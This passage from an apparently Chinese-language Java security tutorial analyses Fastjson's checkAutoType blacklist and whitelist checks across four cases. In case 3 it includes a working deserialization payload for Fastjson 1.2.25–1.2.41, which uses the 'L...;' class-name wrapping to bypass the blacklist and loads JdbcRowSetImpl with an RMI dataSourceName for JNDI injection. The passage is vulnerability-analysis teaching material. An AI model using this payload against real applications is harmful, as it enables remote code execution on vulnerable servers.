</span></span></code></pre></td></tr></table></div></div><p>首先，由于默认autoType关闭，且我们没有手动开启，又没有使用 <code>JSON.parseObject(String, Class)</code> 指定需要反序列化的类，所以expectClass也为null，所以这里会先进入 <code>if (!autoTypeSupport) {</code> 分支：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(!</span><span class=n>autoTypeSupport</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>denyList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>deny</span> <span class=o>=</span> <span class=n>denyList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>deny</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>acceptList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>accept</span> <span class=o>=</span> <span class=n>acceptList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>accept</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里可以看到，就是先进的黑名单校验，如果匹配到了，则抛出异常。然后再进行白名单匹配，匹配到了则直接返回对应的Class对象。这里因为 <code>com.pinger.javasec.fastjson.User</code> 类不在黑名单中，也不在白名单中，所以会接着往下执行到如下代码，抛出异常：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(!</span><span class=n>autoTypeSupport</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=情况2>情况2</h4><p>例如如下代码属于情况2，仍旧没有开启autoType，但是指定了expectClass为Attack类（不能是User类，因为这样就不会进入checkAutoType函数了）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>normal</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>userJson</span><span class=o>=</span><span class=s>&#34;{\&#34;@type\&#34;:\&#34;com.pinger.javasec.fastjson.User\&#34;,\&#34;address\&#34;:\&#34;QT\&#34;,\&#34;age\&#34;:0,\&#34;name\&#34;:\&#34;p1n93r\&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>userJson</span><span class=o>,</span><span class=n>Attack</span><span class=o>.</span><span class=na>class</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里因为 <code>expectClass</code> 的值不为空，所以会进入 <code>if (autoTypeSupport || expectClass != null) {</code> 分支：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>autoTypeSupport</span> <span class=o>||</span> <span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>acceptList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>accept</span> <span class=o>=</span> <span class=n>acceptList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>accept</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>denyList</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=o>++</span><span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>String</span> <span class=n>deny</span> <span class=o>=</span> <span class=n>denyList</span><span class=o>[</span><span class=n>i</span><span class=o>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=n>deny</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，这里也是黑白名单检测，但是注意，这里是先进行白名单检测，再进行黑名单检测，如果白名单匹配到了，就直接返回Class了，不会再进行后续的黑名单检测。所以如果Gadget在白名单中，就可以直接利用了。这里因为className为User，不在黑名单中，也不在白名单中，所以最终会执行如下代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>autoTypeSupport</span> <span class=o>||</span> <span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>ClassLoader</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>)</span> <span class=c1>// classloader is danger
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=o>||</span> <span class=n>DataSource</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>)</span> <span class=c1>// dataSource can load jdbc driver
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;autoType is not support. &#34;</span> <span class=o>+</span> <span class=n>typeName</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>JSONException</span><span class=o>(</span><span class=s>&#34;type not match. &#34;</span> <span class=o>+</span> <span class=n>typeName</span> <span class=o>+</span> <span class=s>&#34; -&gt; &#34;</span> <span class=o>+</span> <span class=n>expectClass</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>先load我们通过@type指定的User类，然后检测是否为 <code>ClassLoader</code> 和 <code>DataSource</code> 类（包括其子类），最后再检测@type指定的类，是否为 <code>expectClass</code> 对应的类（包括子类）， <code>expectClass</code> 的值由 <code>JSON.parseObject(String, Class)</code> 中的Class指定，我们前面指定为Attack类，所以这里会抛出异常：<code>throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName())</code> 。</p><h4 id=情况3>情况3</h4><p>如下代码所示，手动开启autoType，且没有指定expectClass：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>normal</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>userJson</span><span class=o>=</span><span class=s>&#34;{\&#34;@type\&#34;:\&#34;com.pinger.javasec.fastjson.User\&#34;,\&#34;address\&#34;:\&#34;QT\&#34;,\&#34;age\&#34;:0,\&#34;name\&#34;:\&#34;p1n93r\&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 手动开启autoType
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ParserConfig</span><span class=o>.</span><span class=na>getGlobalInstance</span><span class=o>().</span><span class=na>setAutoTypeSupport</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>userJson</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里因为开启了autoType，所以和情况2一样，会进入 <code>if (autoTypeSupport || expectClass != null) {</code> 分支，也就是进行先白后黑的检测，这里都不会被匹配到，所以继续往下执行到 <code>if (autoTypeSupport || expectClass != null) {</code> 分支：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>autoTypeSupport</span> <span class=o>||</span> <span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>clazz</span> <span class=o>=</span> <span class=n>TypeUtils</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>typeName</span><span class=o>,</span> <span class=n>defaultClassLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，这里会load我们@type指定的类，并且返回。回顾这个过程，我们要想到达这里，需要满足以下几个条件：</p><ul><li>@type指定的类，不能在黑名单内；</li><li>@type指定的类，能成功被 <code>TypeUtils.loadClass</code> 加载；</li></ul><p>这里我们1.2.25&lt;=version&lt;=1.2.41版本常见的Payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * 1.2.25&lt;=version&lt;=1.2.41
</span></span></span><span class=line><span class=cl><span class=cm> * 1.2.25开始默认关闭了autotype支持
</span></span></span><span class=line><span class=cl><span class=cm> * 此EXP : Bypass checkAutoType()中的黑白名单校验，但是还是需要开启autoType
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>exp3</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ParserConfig</span><span class=o>.</span><span class=na>getGlobalInstance</span><span class=o>().</span><span class=na>setAutoTypeSupport</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>exp</span><span class=o>=</span><span class=s>&#34;{\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  \&#34;test\&#34;: {\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;@type\&#34;: \&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;dataSourceName\&#34;: \&#34;rmi://127.0.0.1:1099/Exploit\&#34;,\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;    \&#34;autoCommit\&#34;: true\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;  }\n&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=n>exp</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里看到@type指定的值为： <code>Lcom.sun.rowset.JdbcRowSetImpl;</code> ，这个类因为前面多了 <code>L</code> 字符，所以不在黑名单内，成功绕过了黑名单。但是这个类是如何被 <code>TypeUtils.loadClass</code> 加载的呢？我们直接看到 <code>TypeUtils.loadClass</code> 的源码片段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>className</span> <span class=o>==</span> <span class=kc>null</span> <span class=o>||</span> <span class=n>className</span><span class=o>.</span><span class=na>length</span><span class=o>()</span> <span class=o>==</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>clazz</span> <span class=o>=</span> <span class=n>mappings</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=n>className</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>clazz</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>0</span><span class=o>)</span> <span class=o>==</span> <span class=sc>&#39;[&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>componentType</span> <span class=o>=</span> <span class=n>loadClass</span><span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>1</span><span class=o>),</span> <span class=n>classLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>Array</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=n>componentType</span><span class=o>,</span> <span class=n>0</span><span class=o>).</span><span class=na>getClass</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=s>&#34;L&#34;</span><span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=n>className</span><span class=o>.</span><span class=na>endsWith</span><span class=o>(</span><span class=s>&#34;;&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>newClassName</span> <span class=o>=</span> <span class=n>className</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>1</span><span class=o>,</span> <span class=n>className</span><span class=o>.</span><span class=na>length</span><span class=o>()</span> <span class=o>-</span> <span class=n>1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>loadClass</span><span class=o>(</span><span class=n>newClassName</span><span class=o>,</span> <span class=n>classLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>classLoader</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>clazz</span> <span class=o>=</span> <span class=n>classLoader</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=n>className</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>mappings</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=n>className</span><span class=o>,</span> <span class=n>clazz</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>Throwable</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>e</span><span class=o>.</span><span class=na>printStackTrace</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// skip
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>看到 <code>if (className.startsWith("L") && className.endsWith(";")) {</code> 分支：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>className</span><span class=o>.</span><span class=na>startsWith</span><span class=o>(</span><span class=s>&#34;L&#34;</span><span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=n>className</span><span class=o>.</span><span class=na>endsWith</span><span class=o>(</span><span class=s>&#34;;&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>newClassName</span> <span class=o>=</span> <span class=n>className</span><span class=o>.</span><span class=na>substring</span><span class=o>(</span><span class=n>1</span><span class=o>,</span> <span class=n>className</span><span class=o>.</span><span class=na>length</span><span class=o>()</span> <span class=o>-</span> <span class=n>1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>loadClass</span><span class=o>(</span><span class=n>newClassName</span><span class=o>,</span> <span class=n>classLoader</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>如果className以 <code>L</code> 开头，且以 <code>;</code> 结尾，则去掉首尾的这两个字符，然后在递归调用 <code>loadClass</code> 加载类，后续通过 <code>clazz = classLoader.loadClass(className);</code> 成功加载并返回。所以我们@type指定的类成功绕过黑名单后，还能被成功load，于是造成了反序列化漏洞。</p><h4 id=情况4>情况4</h4><p>如下代码所示，手动开启autoType，且指定了expectClass为Attack.class：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>normal</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>userJson</span><span class=o>=</span><span class=s>&#34;{\&#34;@type\&#34;:\&#34;com.pinger.javasec.fastjson.User\&#34;,\&#34;address\&#34;:\&#34;QT\&#34;,\&#34;age\&#34;:0,\&#34;name\&#34;:\&#34;p1n93r\&#34;}&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 手动开启autoType
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ParserConfig</span><span class=o>.</span><span class=na>getGlobalInstance</span><span class=o>().</span><span class=na>setAutoTypeSupport</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>JSON</span><span class=o>.</span><span class=na>parseObject</span><span class=o>(</span><span class=n>userJson</span><span class=o>,</span><span class=n>Attack</span><span class=o>.</span><span class=na>class</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里虽然能成功被 <code>TypeUtils.loadClass</code> 加载，但是因为存在expectClass，且expectClass和load后的Class不是同种类型，导致在如下地方抛出异常，不能正常返回Class：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>expectClass</span><span class=o>.</span><span class=na>isAssignableFrom</span><span class=o>(</span><span class=n>clazz</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>clazz</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
